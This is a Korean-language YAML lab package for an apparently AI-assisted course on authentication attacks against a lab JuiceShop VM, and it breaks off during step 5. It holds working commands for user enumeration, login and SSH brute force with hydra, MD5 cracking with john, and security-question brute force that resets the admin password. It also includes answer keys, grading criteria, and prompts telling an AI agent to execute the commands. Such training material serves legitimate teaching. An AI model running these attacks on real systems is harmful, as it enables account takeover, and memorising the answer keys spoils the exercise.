lab_id: attack-ai-week05
title: 인증 공격 (Authentication Attacks) (AI 지원)
version: ai
course: attack-ai
week: 5
description: 비밀번호 브루트포스, 딕셔너리 공격, 크리덴셜 스터핑, JWT 조작 등 인증 메커니즘을 공격하는 기법을 실습한다. hydra,
  john, hashcat 등의 도구를 활용한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- 온라인/오프라인 비밀번호 크래킹의 원리와 차이를 이해한다
- hydra를 사용한 웹 로그인 브루트포스를 수행할 수 있다
- JWT 토큰의 구조를 분석하고 약점을 공격할 수 있다
pass_threshold: 0.6
steps:
- order: 1
  instruction: JuiceShop의 사용자 목록 API(/api/Users)에서 이메일 주소를 수집하여 공격 대상 사용자 목록을 만들어라.
  hint: |
    curl로 API를 호출하고 python3으로 이메일만 추출한다.

    📎 도구 우선순위 (힌트):
    1) 우선: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json; [print(u['email']) for u in json.load(sys.stdin)['data']]" > /tmp/users.txt
    2) 미설치: sudo apt install -y curl python3
    3) 실패/대안:
       - curl + jq -r '.data[].email'
       - http GET + jq
       - Burp Intruder Sniper
       - ffuf ID enum
       - theHarvester
       - hunter.io / RocketReach
    4) 검증: @ 키워드. CWE-204.
  category: recon
  points: 10
  answer: '🤖 프롬프트: JuiceShop의 사용자 목록 API(/api/Users)에서 이메일 주소를 수집하여 공격 대상 사용자 목록을
    만들어라해줘

    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
    [print(u[''email'']) for u in json.load(sys.stdin)[''data'']]" > /tmp/users.txt
    && cat /tmp/users.txt'
  answer_detail: 공격 대상 사용자 목록을 확보하는 것은 인증 공격의 첫 단계이다. API에서 사용자 정보가 노출되면 유효한 이메일/사용자명을
    수집하여 브루트포스 공격의 효율을 높일 수 있다.
  verify:
    type: output_contains
    expect: '@'
    field: stdout
    semantic:
      intent: JuiceShop /api/Users 에서 이메일 목록 수집 — 인증 공격 준비 단계로 유효한 공격 대상(username)
        확보
      success_criteria:
      - curl -s /api/Users 응답 수신
      - JSON 의 data 배열에서 email 필드만 추출
      - 파일(/tmp/users.txt) 저장 후 @ 포함 이메일 최소 1개 확인
      acceptable_methods:
      - "curl + python email (수기 baseline): /api/Users → email 추출."
      - "curl + jq -r '.data[].email'."
      - "httpie + jq."
      - "Burp Intruder Sniper."
      - "ffuf ID enum."
      - "theHarvester."
      - "hunter.io / RocketReach."
      - "Postman Runner."
      - "Bastion AI 자동 enum."
      negative_signs:
      - 이메일 추출 누락
      - 사용자 열거 맥락 없음
      - 후속 brute force 활용 맥락 없음
      negative_signs:
      - /api/Users 가 아닌 다른 엔드포인트 조회
      - 이메일 추출 없이 전체 JSON 만
      - 공격 대상 목록의 용도 설명 없음
  target_vm: attacker
  script: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
    [print(u['email']) for u in json.load(sys.stdin)['data']]" > /tmp/users.txt &&
    cat /tmp/users.txt
  risk_level: low
  bastion_prompt: 'JuiceShop의 사용자 목록 API(/api/Users)에서 이메일 주소를 수집하여 공격 대상 사용자 목록을
    만들어라해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: JuiceShop 로그인 API에 대해 일반적인 비밀번호 목록을 사용하여 수동 브루트포스를 시도하라. admin@juice-sh.op
    계정을 대상으로 하라.
  hint: |
    for 루프와 curl을 조합하여 여러 비밀번호를 시도한다.

    📎 도구 우선순위 (힌트):
    1) 우선: for pw in admin admin123 password ...; do curl -X POST /rest/user/login ...; done
    2) 미설치: sudo apt install -y curl python3
    3) 실패/대안:
       - hydra http-post-form (자동화 표준)
       - Burp Intruder Sniper / Cluster bomb
       - ncrack -p 3000
       - patator http_fuzz
       - medusa -M http
    4) 검증: SUCCESS/FAIL + authentication 키.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: JuiceShop 로그인 API에 대해 일반적인 비밀번호 목록을 사용하여 수동 브루트포스를 시도하라. admin@juice-sh.op
    계정을 대상으로 해줘

    📎 참고 (CLI): for pw in admin admin123 password 12345 admin1234; do echo -n "Trying:
    $pw -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}"
    | python3 -c "import sys,json; d=json.load(sys.stdin); print(''SUCCESS'' if ''authentication''
    in d else ''FAIL'')"; done'
  answer_detail: 수동 브루트포스는 스크립팅을 통해 반복 로그인을 시도하는 기법이다. 실전에서는 계정 잠금, CAPTCHA, rate
    limiting 등의 방어 메커니즘이 있어 자동화 도구가 필요하다.
  verify:
    type: output_contains
    expect:
    - Trying
    - authentication
    field: stdout
    semantic:
      intent: JuiceShop 로그인 API 수동 브루트포스 — admin@juice-sh.op 계정에 흔한 비밀번호(admin/admin123/password)
        여러개 시도
      success_criteria:
      - for 루프로 5개 이상 비밀번호 시도
      - '각 시도 결과를 Trying: <pw> -> SUCCESS/FAIL 형식으로 출력'
      - 응답 JSON 의 authentication 키 존재 여부로 성공 판정
      acceptable_methods:
      - "bash for + curl POST + python json (수기 baseline)."
      - "hydra http-post-form."
      - "Burp Intruder Sniper."
      - "ncrack -p 3000."
      - "patator http_fuzz."
      - "medusa -M http."
      - "ffuf payload fuzz."
      - "Burp Turbo Intruder."
      - "Bastion AI 브루트 자동화."
      negative_signs:
      - 비밀번호 1-2개만 시도
      - 응답 해석 없이 로그만 출력
      - rate limiting/계정 잠금 방어 언급 없음
  target_vm: attacker
  script: 'for pw in admin admin123 password 12345 admin1234; do echo -n "Trying:
    $pw -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}"
    | python3 -c "import sys,json; d=json.load(sys.stdin); print(''SUCCESS'' if ''authentication''
    in d else ''FAIL'')"; done'
  risk_level: medium
  bastion_prompt: 'JuiceShop 로그인 API에 대해 일반적인 비밀번호 목록을 사용하여 수동 브루트포스를 시도하라. admin@juice-sh.op
    계정을 대상으로 해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: hydra를 사용하여 SSH 서비스({{WEB_IP}}:22)에 대한 비밀번호 브루트포스를 시도하라. 사용자는 web,
    비밀번호 사전은 /usr/share/wordlists/rockyou.txt의 상위 100개를 사용하라.
  hint: |
    hydra -l 사용자 -P 사전파일 ssh://타겟 형태로 실행한다.

    📎 도구 우선순위 (힌트):
    1) 우선: head -100 /usr/share/wordlists/rockyou.txt > /tmp/top100.txt; hydra -l web -P /tmp/top100.txt ssh://10.20.30.80 -t 4 -f
    2) 미설치: sudo apt install -y hydra wordlists
    3) 실패/대안:
       - medusa -u web -P top100.txt -M ssh -h 10.20.30.80
       - patator ssh_login user=web password=FILE0 0=top100.txt host=10.20.30.80
       - ncrack --user web -P top100.txt ssh://10.20.30.80
       - crowbar -b sshkey -s 10.20.30.80/32 -u web -k key
       - sshpass + bash for
    4) 검증: [DATA] / [ATTEMPT] / [22][ssh] login:.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: hydra를 사용하여 SSH 서비스(10.20.30.80:22)에 대한 비밀번호 브루트포스를 시도해줘

    📎 참고 (CLI): head -100 /usr/share/wordlists/rockyou.txt > /tmp/top100.txt 2>/dev/null;
    hydra -l web -P /tmp/top100.txt ssh://10.20.30.80 -t 4 -f'
  answer_detail: hydra는 다양한 프로토콜(SSH, HTTP, FTP, SMB 등)에 대한 온라인 브루트포스 도구이다. -t 옵션으로
    동시 스레드 수를 제어하고, -f 옵션으로 첫 성공 시 중단한다. SSH는 기본적으로 rate limiting이 있어 느리다.
  verify:
    type: output_contains
    expect: hydra
    field: stdout
    semantic:
      intent: hydra SSH 브루트포스 — top100 wordlist 로 web VM 의 22 포트 SSH 로그인 시도 (-t 4
        -f 로 첫 성공 시 중단)
      success_criteria:
      - hydra -l web -P <wordlist> ssh://<IP> 실행
      - hydra 출력에 [DATA], [ATTEMPT], [STATUS] 라인 포함
      - SSH rate limiting 때문에 느림을 설명
      acceptable_methods:
      - "hydra -l web -P top100 ssh://IP -t 4 -f (수기 baseline)."
      - "medusa -u web -P top100 -M ssh -h IP."
      - "patator ssh_login."
      - "ncrack --user web -P top100 ssh://IP."
      - "crowbar -b sshkey."
      - "sshpass + bash for."
      - "Metasploit auxiliary/scanner/ssh/ssh_login."
      - "Burp Pro 자동 SSH plugin."
      - "Bastion AI SSH brute orchestrator."
      negative_signs:
      - wordlist 지정 없이 단일 비밀번호
      - 프로토콜 잘못 (http 로 SSH 공격)
      - 계정 잠금·rate limit 언급 없음
  target_vm: attacker
  script: head -100 /usr/share/wordlists/rockyou.txt > /tmp/top100.txt 2>/dev/null;
    hydra -l web -P /tmp/top100.txt ssh://10.20.30.80 -t 4 -f
  risk_level: medium
  bastion_prompt: 'hydra를 사용하여 SSH 서비스(10.20.30.80:22)에 대한 비밀번호 브루트포스를 시도해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: John the Ripper를 사용하여 MD5 해시를 크래킹하라. 먼저 echo -n 'admin123' | md5sum으로
    해시를 생성하고, john으로 복원하라.
  hint: |
    해시를 파일에 저장하고 john --format=raw-md5로 크래킹한다.

    📎 도구 우선순위 (힌트):
    1) 우선: echo -n 'admin123' | md5sum | awk '{print $1}' > /tmp/hash.txt && john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt; john --format=raw-md5 --show /tmp/hash.txt
    2) 미설치: sudo apt install -y john wordlists
    3) 실패/대안:
       - hashcat -m 0 -a 0 hash.txt rockyou.txt --show
       - rainbow table 조회(crackstation.net)
       - python hashlib.md5 비교 (자작 cracker)
       - hashes.com online API
    4) 검증: john --show admin123. CWE-916.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: John the Ripper를 사용하여 MD5 해시를 크래킹해줘

    📎 참고 (CLI): echo -n ''admin123'' | md5sum | awk ''{print $1}'' > /tmp/hash.txt
    && john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt
    2>/dev/null; john --format=raw-md5 --show /tmp/hash.txt'
  answer_detail: 오프라인 비밀번호 크래킹은 해시 값을 확보한 후 원문을 복원하는 기법이다. MD5는 더 이상 안전하지 않은 해시 알고리즘으로,
    rainbow table이나 사전 공격으로 빠르게 크래킹된다.
  verify:
    type: output_contains
    expect:
    - admin123
    - john
    field: stdout
    semantic:
      intent: John the Ripper 오프라인 MD5 크래킹 — echo | md5sum 으로 해시 생성 후 rockyou wordlist
        로 원문 복원
      success_criteria:
      - md5sum 으로 admin123 해시 생성 (/tmp/hash.txt 저장)
      - john --format=raw-md5 --wordlist=rockyou.txt 실행
      - john --show 출력에서 admin123 복원 확인
      acceptable_methods:
      - "john --format=raw-md5 --wordlist=rockyou (수기 baseline) → --show 복원."
      - "hashcat -m 0 -a 0 hash.txt rockyou."
      - "crackstation.net rainbow table."
      - "hashes.com online cracker."
      - "python hashlib.md5 brute."
      - "openssl md5 + grep."
      - "RainbowCrack."
      - "Cain & Abel."
      - "Bastion AI 해시 크래킹 orchestrator."
      negative_signs:
      - 해시 없이 john 실행
      - --format 미지정
      - 결과 복원 확인 없이 종료
  target_vm: attacker
  script: echo -n 'admin123' | md5sum | awk '{print $1}' > /tmp/hash.txt && john --format=raw-md5
    --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt 2>/dev/null; john --format=raw-md5
    --show /tmp/hash.txt
  risk_level: medium
  bastion_prompt: 'John the Ripper를 사용하여 MD5 해시를 크래킹해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: JuiceShop의 비밀번호 재설정 기능(/rest/user/reset-password)을 사용하여 보안 질문 답변 브루트포스를
    시도하라. admin@juice-sh.op 계정을 대상으로 하라.
  hint: |
    보안 질문의 답변을 추측하여 비밀번호를 재설정한다.

    📎 도구 우선순위 (힌트):
    1) 우선: for ans in 'replicator' 'Mr. Robot' 'Jim' 'Samuel'; do curl -X POST /rest/user/reset-password -d "{...$ans...}" ; done
    2) 미설치: sudo apt install -y curl
    3) 실패/대안:
       - Burp Intruder sniper on answer field
       - ffuf -d {email,answer,new,repeat} -w answers.txt
       - python requests.post 반복
       - OSINT (twitter / facebook / linkedin) → 답변 후보 도출
       - haveibeenpwned breach data
    4) 검증: error/Wrong vs success. CWE-640.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: JuiceShop의 비밀번호 재설정 기능(/rest/user/reset-password)을 사용하여 보안 질문 답변
    브루트포스를 시도하라. admin@juice-sh.op 계정을 대상으로 해줘

    📎 참고 (CLI): for ans in ''replicator'' ''Mr. Robot'' ''Jim'' ''Samuel''; do echo
    -n "Answer: $ans -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password
    -H ''Content-Type: application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ans\",\"new\":\"hacked123\",\"repeat\":\"hacked123\"}"
    | head -c 100; echo; done'
  answer_detail: 보안 질문 기반 비밀번호 재설정은 추측 가능한 답변으로 인해 취약하다. OSINT로 수집한 정보(SNS, 블로그 등)를
    활용하면 보안 질문의 답변을 추측할 수 있다.
  verify:
    type: output_contains
    expect:
    - 'Answer:'
    - Wrong
    field: stdout
    semantic:
      intent: JuiceShop /rest/user/reset-password 보안 질문 답변 브루트포스 — admin 계정의 보안 질문(예
        pet name) 답변 후보 여러개 시도해 비번 재설정
      success_criteria:
      - for 루프로 4개 이상 답변 후보 시도
      - '각 시도 결과를 Answer: <val> -> 응답 형식으로 출력'
      - OSINT 로 답변 추측 가능함(SNS 프로필) 언급
      acceptable_methods:
      - "bash for + curl -X POST reset-password (수기 baseline)."
      - "Burp Intruder Sniper on answer field."
      - "ffuf -d 답변 fuzz."
      - "python requests.post 반복."
      - "patator http_fuzz."
      - "hydra http-post-form (answer 필드)."
      - "OSINT (linkedin / twitter / facebook)."
      - "haveibeenpwned breach data."
      - "Bastion AI 보안 질문 brute orchestrator."
      negative_signs:
      - 답변 1-2개만 시도
      - 보안 질문 취약점 원리 설명 없음
      - OSINT 활용 맥락 언급 없음
  target_vm: attacker
  script: 'for ans in ''replicator'' ''Mr. Robot'' ''Jim'' ''Samuel''; do echo -n
    "Answer: $ans -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password
    -H ''Content-Type: application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ans\",\"new\":\"hacked123\",\"repeat\":\"hacked123\"}"
